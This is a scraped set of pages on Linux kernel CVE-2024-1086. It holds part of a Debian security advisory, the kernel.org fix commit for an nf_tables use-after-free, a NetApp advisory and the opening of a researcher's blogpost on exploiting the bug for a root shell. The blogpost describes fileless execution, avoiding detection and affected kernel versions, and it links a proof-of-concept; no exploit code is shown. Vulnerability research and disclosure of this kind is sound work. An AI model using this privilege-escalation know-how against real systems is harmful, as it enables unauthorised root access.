                 CVE-2023-52340 CVE-2023-52429 CVE-2023-52436 CVE-2023-52439
                 CVE-2023-52443 CVE-2023-52444 CVE-2023-52445 CVE-2023-52449
                 CVE-2023-52464 CVE-2023-52469 CVE-2023-52470 CVE-2023-52486
                 CVE-2023-52583 CVE-2023-52587 CVE-2023-52594 CVE-2023-52599
                 CVE-2023-52600 CVE-2023-52601 CVE-2023-52602 CVE-2023-52603
                 CVE-2023-52604 CVE-2023-52609 CVE-2023-52612 CVE-2023-52615
                 CVE-2023-52619 CVE-2023-52620 CVE-2023-52622 CVE-2023-52623
                 CVE-2023-52628 CVE-2023-52644 CVE-2023-52650 CVE-2023-52670
                 CVE-2023-52679 CVE-2023-52683 CVE-2023-52691 CVE-2023-52693
                 CVE-2023-52698 CVE-2023-52699 CVE-2023-52880 CVE-2024-0340
                 CVE-2024-0607 CVE-2024-1086 CVE-2024-22099 CVE-2024-23849
                 CVE-2024-23851 CVE-2024-24857 CVE-2024-24858 CVE-2024-24861
                 CVE-2024-25739 CVE-2024-26597 CVE-2024-26600 CVE-2024-26602
                 CVE-2024-26606 CVE-2024-26615 CVE-2024-26625 CVE-2024-26633
                 CVE-2024-26635 CVE-2024-26636 CVE-2024-26642 CVE-2024-26645
                 CVE-2024-26651 CVE-2024-26663 CVE-2024-26664 CVE-2024-26671
                 CVE-2024-26675 CVE-2024-26679 CVE-2024-26685 CVE-2024-26696
                 CVE-2024-26697 CVE-2024-26704 CVE-2024-26720 CVE-2024-26722
                 CVE-2024-26735 CVE-2024-26744 CVE-2024-26752 CVE-2024-26754
                 CVE-2024-26763 CVE-2024-26764 CVE-2024-26766 CVE-2024-26772
                 CVE-2024-26773 CVE-2024-26777 CVE-2024-26778 CVE-2024-26779
                 CVE-2024-26791 CVE-2024-26793 CVE-2024-26801 CVE-2024-26805
                 CVE-2024-26816 CVE-2024-26817 CVE-2024-26820 CVE-2024-26825
                 CVE-2024-26839 CVE-2024-26840 CVE-2024-26845 CVE-2024-26851
                 CVE-2024-26852 CVE-2024-26857 CVE-2024-26859 CVE-2024-26863
                 CVE-2024-26874 CVE-2024-26875 CVE-2024-26878 CVE-2024-26880
                 CVE-2024-26883 CVE-2024-26884 CVE-2024-26889 CVE-2024-26894
                 CVE-2024-26898 CVE-2024-26901 CVE-2024-26903 CVE-2024-26917
                 CVE-2024-26922 CVE-2024-26923 CVE-2024-26931 CVE-2024-26934
                 CVE-2024-26955 CVE-2024-26956 CVE-2024-26965 CVE-2024-26966
                 CVE-2024-26969 CVE-2024-26973 CVE-2024-26974 CVE-2024-26976
                 CVE-2024-26981 CVE-2024-26984 CVE-2024-26993 CVE-2024-26994
                 CVE-2024-26997 CVE-2024-27001 CVE-2024-27008 CVE-2024-27013
                 CVE-2024-27020 CVE-2024-27024 CVE-2024-27028 CVE-2024-27043
                 CVE-2024-27046 CVE-2024-27059 CVE-2024-27074 CVE-2024-27075
                 CVE-2024-27077 CVE-2024-27078 CVE-2024-27388 CVE-2024-27395
                 CVE-2024-27396 CVE-2024-27398 CVE-2024-27399 CVE-2024-27401
                 CVE-2024-27405 CVE-2024-27410 CVE-2024-27412 CVE-2024-27413
                 CVE-2024-27416 CVE-2024-27419 CVE-2024-27436 CVE-2024-31076
                 CVE-2024-33621 CVE-2024-35789 CVE-2024-35806 CVE-2024-35807
                 CVE-2024-35809 CVE-2024-35811 CVE-2024-35815 CVE-2024-35819
                 CVE-2024-35821 CVE-2024-35822 CVE-2024-35823 CVE-2024-35825
                 CVE-2024-35828 CVE-2024-35830 CVE-2024-35835 CVE-2024-35847
                 CVE-2024-35849 CVE-2024-35877 CVE-2024-35886 CVE-2024-35888
                 CVE-2024-35893 CVE-2024-35898 CVE-2024-35902 CVE-2024-35910
                 CVE-2024-35915 CVE-2024-35922 CVE-2024-35925 CVE-2024-35930
                 CVE-2024-35933 CVE-2024-35935 CVE-2024-35936 CVE-2024-35944
                 CVE-2024-35947 CVE-2024-35955 CVE-2024-35960 CVE-2024-35969
                 CVE-2024-35973 CVE-2024-35978 CVE-2024-35982 CVE-2024-35984
                 CVE-2024-35997 CVE-2024-36004 CVE-2024-36014 CVE-2024-36015
                 CVE-2024-36016 CVE-2024-36017 CVE-2024-36020 CVE-2024-36286
                 CVE-2024-36288 CVE-2024-36883 CVE-2024-36886 CVE-2024-36902
                 CVE-2024-36904 CVE-2024-36905 CVE-2024-36919 CVE-2024-36933
                 CVE-2024-36934 CVE-2024-36940 CVE-2024-36941 CVE-2024-36946
                 CVE-2024-36950 CVE-2024-36954 CVE-2024-36959 CVE-2024-36960
                 CVE-2024-36964 CVE-2024-36971 CVE-2024-37353 CVE-2024-37356
                 CVE-2024-38381 CVE-2024-38549 CVE-2024-38552 CVE-2024-38558
                 CVE-2024-38559 CVE-2024-38560 CVE-2024-38565 CVE-2024-38567
                 CVE-2024-38578 CVE-2024-38579 CVE-2024-38582 CVE-2024-38583
                 CVE-2024-38587 CVE-2024-38589 CVE-2024-38596 CVE-2024-38598
                 CVE-2024-38599 CVE-2024-38601 CVE-2024-38612 CVE-2024-38618
                 CVE-2024-38621 CVE-2024-38627 CVE-2024-38633 CVE-2024-38634
                 CVE-2024-38637 CVE-2024-38659 CVE-2024-38780 CVE-2024-39292

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

For Debian 10 buster, these problems have been fixed in version
4.19.316-1.

We recommend that you upgrade your linux packages.

For the detailed security status of linux please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpg1YwLnofmR.pgp)**

*Description:* PGP signature

---



=== Content from git.kernel.org_d60f9ff3_20250111_070331.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=f342de4e2f33e0e39165d8639387aa6c19dff660)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=f342de4e2f33e0e39165d8639387aa6c19dff660)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f342de4e2f33e0e39165d8639387aa6c19dff660)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=f342de4e2f33e0e39165d8639387aa6c19dff660)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Florian Westphal <fw@strlen.de> | 2024-01-20 22:50:04 +0100 |
| --- | --- | --- |
| committer | Pablo Neira Ayuso <pablo@netfilter.org> | 2024-01-24 20:02:39 +0100 |
| commit | [f342de4e2f33e0e39165d8639387aa6c19dff660](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f342de4e2f33e0e39165d8639387aa6c19dff660) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=f342de4e2f33e0e39165d8639387aa6c19dff660)) | |
| tree | [1c2ffb712170efefbf421192b3a73bf17526524e](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=f342de4e2f33e0e39165d8639387aa6c19dff660) | |
| parent | [b462579b2b86a8f5230543cadd3a4836be27baf7](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b462579b2b86a8f5230543cadd3a4836be27baf7) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=f342de4e2f33e0e39165d8639387aa6c19dff660&id2=b462579b2b86a8f5230543cadd3a4836be27baf7)) | |
| download | [linux-f342de4e2f33e0e39165d8639387aa6c19dff660.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-f342de4e2f33e0e39165d8639387aa6c19dff660.tar.gz) | |

netfilter: nf\_tables: reject QUEUE/DROP verdict parametersThis reverts commit e0abdadcc6e1.
core.c:nf\_hook\_slow assumes that the upper 16 bits of NF\_DROP
verdicts contain a valid errno, i.e. -EPERM, -EHOSTUNREACH or similar,
or 0.
Due to the reverted commit, its possible to provide a positive
value, e.g. NF\_ACCEPT (1), which results in use-after-free.
Its not clear to me why this commit was made.
NF\_QUEUE is not used by nftables; "queue" rules in nftables
will result in use of "nft\_queue" expression.
If we later need to allow specifiying errno values from userspace
(do not know why), this has to call NF\_DROP\_GETERR and check that
"err <= 0" holds true.
Fixes: e0abdadcc6e1 ("netfilter: nf\_tables: accept QUEUE/DROP verdict parameters")
Cc: stable@vger.kernel.org
Reported-by: Notselwyn <notselwyn@pwning.tech>
Signed-off-by: Florian Westphal <fw@strlen.de>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=f342de4e2f33e0e39165d8639387aa6c19dff660)

| -rw-r--r-- | [net/netfilter/nf\_tables\_api.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/net/netfilter/nf_tables_api.c?id=f342de4e2f33e0e39165d8639387aa6c19dff660) | 16 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 6 insertions, 10 deletions

| diff --git a/net/netfilter/nf\_tables\_api.c b/net/netfilter/nf\_tables\_api.cindex 02f45424644b4d..c537104411e7d1 100644--- a/[net/netfilter/nf\_tables\_api.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/netfilter/nf_tables_api.c?id=b462579b2b86a8f5230543cadd3a4836be27baf7)+++ b/[net/netfilter/nf\_tables\_api.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/netfilter/nf_tables_api.c?id=f342de4e2f33e0e39165d8639387aa6c19dff660)@@ -10992,16 +10992,10 @@ static int nft\_verdict\_init(const struct nft\_ctx \*ctx, struct nft\_data \*data, data->verdict.code = ntohl(nla\_get\_be32(tb[NFTA\_VERDICT\_CODE]));  switch (data->verdict.code) {- default:- switch (data->verdict.code & NF\_VERDICT\_MASK) {- case NF\_ACCEPT:- case NF\_DROP:- case NF\_QUEUE:- break;- default:- return -EINVAL;- }- fallthrough;+ case NF\_ACCEPT:+ case NF\_DROP:+ case NF\_QUEUE:+ break; case NFT\_CONTINUE: case NFT\_BREAK: case NFT\_RETURN:@@ -11036,6 +11030,8 @@ static int nft\_verdict\_init(const struct nft\_ctx \*ctx, struct nft\_data \*data,  data->verdict.chain = chain; break;+ default:+ return -EINVAL; }  desc->len = sizeof(data->verdict); |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-11 07:02:08 +0000



=== Content from security.netapp.com_0ef0e2d6_20250111_070335.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2024-1086 Linux Kernel Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20240614-0009)

## CVE-2024-1086 Linux Kernel Vulnerability in NetApp Products

circle-info

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20240614-0009 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20240614-0009 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20240614-0009 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20240614-0009 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20240614-0009
**Version:**
12.0

**Last updated:**
10/24/2024

**Status:**
Interim.

**CVEs:** CVE-2024-1086

Overview
#### Summary

Multiple NetApp products incorporate Linux kernel. Linux kernel versions prior to 6.8-rc2 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250

#### Products Under Investigation

* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)

#### Products Not Affected

* AFF BIOS - A1K/A70/A90
* AFF BIOS - A700s
* AFF Baseboard Management Controller (BMC) - A1K/A70/A90
* AFF Baseboard Management Controller (BMC) - A700s
* AFF LOADER- A1K/A70/A90
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Control Provisioner
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Volumes ONTAP Mediator
* Data Infrastructure Insights Acquisition Unit (formerly Cloud Insights Acquisition Unit)
* Data Infrastructure Insights Storage Workload Security Agent (formerly Cloud Insights Storage Workload Security Agent)
* Data Infrastructure Insights Telegraf Agent (formerly Cloud Insights Telegraf Agent)
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 2820
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF BIOS - A250/500f/C250
* FAS/AFF BIOS - A300/8200/C190/A220/2720/2750/A150
* FAS/AFF BIOS - A320
* FAS/AFF BIOS - A700/9000
* FAS/AFF BIOS - A800/C800
* FAS/AFF BIOS - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A320
* FAS/AFF Baseboard Management Controller (BMC) - A800/C800
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Baseboard Management Controller (BMC) - FAS2820
* FAS/AFF Service Processor - A300/8200
* FAS/AFF Service Processor - A700/9000
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM12 SAS Disk Shelf Firmware
* IOM12B SAS Disk Shelf Firmware
* IOM12E SAS Disk Shelf Firmware
* IOM12F SAS Disk Shelf Firmware
* IOM12G SAS Disk Shelf Firmware
* IOM6 SAS Disk Shelf Firmware
* IOM6E SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster DataCollector
* MetroCluster Tiebreaker
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp DataOps Toolkit
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* ONTAP tools for VMware vSphere 10
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* RcfFileGenerator for MetroCluster IP
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapGathers
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100/SG1100/SG110
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG5812/SG5860
* StorageGRID BIOS SG6060/SGF6024/SGF6112/SG6160
* StorageGRID Baseboard Management Controller (BMC) - SG6060/SG6160/SGF6024/SGF6112/SG100/SG110/SG1000/SG1100
* StorageGRID Baseboard Management Controller (BMC) SG5812/SG5860
* System Manager 9.x
* Terraform Provider for ONTAP

Remediation
#### Software Versions and Fixes

None.

This section will be updated as patches are released.

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

mysupport.netapp.com

1 888 4 NETAPP (1 888 463 8277) (U.S. and Canada)

+00 800 44 638277 (EMEA/Europe)

+800 800 80 800 (Asia/Pacific)

Revision History
#### Status of This Notice

**Interim.**

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20240614-0009>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20240614 | Initial Public Release |
| 2.0 | 20240615 | E-Series SANtricity OS Controller Software 11.x and NetApp Converged Systems Advisor Agent moved to Products Not Affected |
| 3.0 | 20240618 | SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine moved to Products Not Affected |
| 4.0 | 20240621 | FAS/AFF Baseboard Management Controller (BMC) - FAS2820, FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750, FAS/AFF Baseboard Management Controller (BMC) - A800/C800, FAS/AFF Service Processor - A700/9000, FAS/AFF Service Processor - A300/8200/A200/2650/2620, FAS/AFF Baseboard Management Controller (BMC) - A320, FAS/AFF Baseboard Management Controller (BMC) - A900/9500, ONTAP tools for VMware vSphere 9 moved to Products Not Affected |
| 5.0 | 20240701 | Active IQ Unified Manager for VMware vSphere and FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400 moved to Products Not Affected |
| 6.0 | 20240708 | Cloud Volumes ONTAP Mediator moved to Products Not Affected |
| 7.0 | 20240711 | NetApp HCI Baseboard Management Controller (BMC) - H615C, NetApp HCI Baseboard Management Controller (BMC) - H610S, and NetApp HCI Baseboard Management Controller (BMC) - H610C moved to Products Not Affected |
| 8.0 | 20240719 | FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250 added to Software Versions and Fixes |
| 9.0 | 20240801 | Brocade Fabric Operating System Firmware moved to Products Not Affected |
| 10.0 | 20240926 | ONTAP tools for VMware vSphere 10 moved to Products Not Affected |
| 11.0 | 20241014 | ONTAP Select Deploy administration utility moved to Products Not Affected |
| 12.0 | 20241024 | AFF Baseboard Management Controller (BMC) - A700s moved to Products Not Affected |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from pwning.tech_d1b703c5_20250111_070335.html ===

[![Pwning Tech](https://pwning.tech/content/images/2024/02/frontpage_logo-12.svg)](https://pwning.tech)

* [Home](https://pwning.tech/)
* [Infrastructure](https://pwning.tech/infra/)
* [About](https://pwning.tech/about/)
* [Twitter](https://twitter.com/notselwyn/)
* [Github](https://github.com/notselwyn/)

[Linux Kernel](/tag/linux-kernel/)

 Featured
# Flipping Pages: An analysis of a new Linux vulnerability in nf\_tables and hardened exploitation techniques

A tale about exploiting KernelCTF Mitigation, Debian, and Ubuntu instances with a double-free in nf\_tables in the Linux kernel, using novel techniques like Dirty Pagedirectory. All without even having to recompile the exploit for different kernel targets once.

#### [notselwyn](/author/notselwyn-2/)

Mar 26, 2024
• 77 min read

This blogpost is the next instalment of my series of hands-on no-boilerplate vulnerability research blogposts, intended for time-travellers in the future who want to do Linux kernel vulnerability research. Specifically, I hope beginners will learn from my VR workflow and the seasoned researchers will learn from my techniques.

In this blogpost, I'm discussing a bug I found in nf\_tables in the Linux kernel ([CVE-2024-1086](https://www.cvedetails.com/cve/CVE-2024-1086/)) and its root cause analysis. Then, I show several novel techniques I used to drop a universal root shell on nearly all Linux kernels between at least v5.14 and v6.6.14 (unpriv userns required) without even recompiling the exploit. This is possible because of the data-only, KSMA ambience of the exploit. Among those targeted kernels are Ubuntu kernels, recent Debian kernels, and one of the most hardened Linux kernels out there (KernelCTF mitigation kernels).

Additionally, I'm providing the proof-of-concept source code (also available in the [CVE-2024-1086 PoC repository](https://github.com/Notselwyn/CVE-2024-1086) on Github). As a bonus, I wanted to challenge myself by making the exploit support fileless execution (which helps in CNO and avoids detections in pentests), and by not making any changes to the disk whatsoever (including setting /bin/sh to SUID 0 et cetera).

This blogpost aims to be a supplementary guide to the original [Dirty Pagetable blogpost](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html) as well, considering there were not any blogposts covering the practical bits (e.g. TLB flushing for exploits) when I started writing this blogpost. Additionally, I hope the skb-related techniques will be embedded in remote network-based exploits (e.g. bugs in IPv4, if they still exist), and I hope that the Dirty Pagedirectory technique will be utilized for LPE exploits. Let's get to the good stuff!

![](https://pwning.tech/content/images/2024/03/-cover_better-4.svg)

Blogpost image cover: birdseye view of exploit including the vulnerability and some of the techniques for visual purposes.

## 0. Before you read

### 0.1. How to read this blogpost

To the aspiring vulnerability researchers: I wrote this blogpost in a way that slightly represents a research paper in terms of the format, because the format happens to be exactly what I was looking for: it is easy to scan and cherrypick knowledge from even though it may be a big pill to swallow. Because research papers are considered hard to read by many people, I'd like to give steps on how I would read this blogpost to extract knowledge efficiently:

1. Read the overview section (check if the content is even interesting to you)
2. Split-screen this blogpost (reading and looking up)
3. Skip to the bug section (try to understand how the bug works)
4. Skip to the proof of concept section (walk through the exploit)

If things are not clear, utilize the background and/or techniques section. If you want to learn more about a specific topic, I have attached an external article for most sections.

### 0.2. Affected kernel versions

This section contains information about the affected kernel versions for this exploit, which is useful when looking up existing techniques for exploiting a bug. Based on these observations, it seems feasable that all versions from atleast (including) v5.14.21 to (including) v6.6.14 are exploitable, depending on the kconfig values (details below). This means that at the time of writing, the stable branches `linux-5.15.y`, `linux-6.1.y`, and `linux-6.6.y` are affected by this exploit, and perhaps `linux-6.7.1` as well. Fortunately for the users, a bugfix in the stable branches has been released in February 2024.

> Note that the same base config file was reused for most vanilla kernels, and that the mentioned versions are all vulnerable to the PoC bug. The base config was generated with `kernel-hardening-checker`. Additionally, if a version isn't affected by the bug, yet the exploitation techniques work, it will not be displayed in the table.

For vanilla kernels, `CONFIG_INIT_ON_FREE_DEFAULT_ON` was toggled off in the config, which sets a page to null-bytes after free - which thwarts the skb part of for the exploit. This config value is toggled off in major distro's like KernelCTF, Ubuntu, and Debian, so I consider this an acceptable measure. However, `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` remains toggled on, as this is part of the Ubuntu and Debian kernel config. Unfortunately, this causes `bad_page()` detection as an side-effect in versions starting from v6.4.0. When `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` is toggled off, the exploit is working up to (including) v6.6.4.

The **success rate** for the exploit is **99.4%** (n=1000) - sometimes with drops to 93.0% (n=1000) - on Linux kernel v6.4.16, with the setup as below (and the kernelctf filesystem). I do not expect the success rate to deviate much across versions, although it might deviate per device workload. I consider an exploit working for a particular setup if it succeeds all attempts at trying it out (manual verification, so usually 1-2 tries). Because of the high success rate, it is pretty easy to filter out if the exploit works or not. Additionally, all fails have been investigated and hence have their reasons been included in the table, so false positives are unlikely.

All non-obsolete techniques (and the resulting PoC) are tested on setups:

```
| Kernel | Kernel Version | Distro    | Distro Version    | Working/Fail | CPU Platform      | CPU Cores | RAM Size | Fail Reason                                                                           | Test Status | Config URL                                                                                                                               |
|--------|----------------|-----------|-------------------|--------------|-------------------|-----------|----------|---------------------------------------------------------------------------------------|-------------|------------------------------------------------------------------------------------------------------------------------------------------|
| Linux  | v5.4.270       | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [CODE] pre-dated nft code (denies rule alloc)                                         | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.4.270.config               |
| Linux  | v5.10.209      | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] BUG mm/slub.c:4118                                                            | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.10.209.config              |
| Linux  | v5.14.21       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.14.21.config               |
| Linux  | v5.15.148      | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.15.148.config              |
| Linux  | v5.16.20       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.16.20.config               |
| Linux  | v5.17.15       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.17.15.config               |
| Linux  | v5.18.19       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.18.19.config               |
| Linux  | v5.19.17       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.19.17.config               |
| Linux  | v6.0.19        | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.0.19.config                |
| Linux  | v6.1.55        | KernelCTF | Mitigation v3     | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-kernelctf-mitigationv3-v6.1.55.config |
| Linux  | v6.1.69        | Debian    | Bookworm 6.1.0-17 | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-debian-v6.1.0-17-amd64.config         |
| Linux  | v6.1.69        | Debian    | Bookworm 6.1.0-17 | working      | AMD Ryzen 5 7640U | 6         | 32GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-debian-v6.1.0-17-amd64.config         |
| Linux  | v6.1.72        | KernelCTF | LTS               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-kernelctf-lts-v6.1.72.config          |
